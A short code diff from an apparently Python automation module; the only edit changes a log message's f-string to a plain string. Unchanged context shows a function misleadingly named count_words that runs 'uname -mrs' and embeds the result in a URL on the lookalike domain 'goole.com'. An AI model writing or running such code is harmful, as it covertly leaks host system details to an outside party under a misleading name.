@@ -2,7 +2,7 @@ from spiral.core import tasks
 
 
 def count_words(app, connection, verbose=False):
-    app.log.info(f'Automation count_words called')
+    app.log.info('Automation count_words called')
     result = connection.run('uname -mrs', hide=not verbose, warn=False)
     url = f'https://goole.com/q="{result.stdout}"'.replace('\n', '').replace('\r', '')
     app.log.info(f'Run actor from automation with url: {url}')
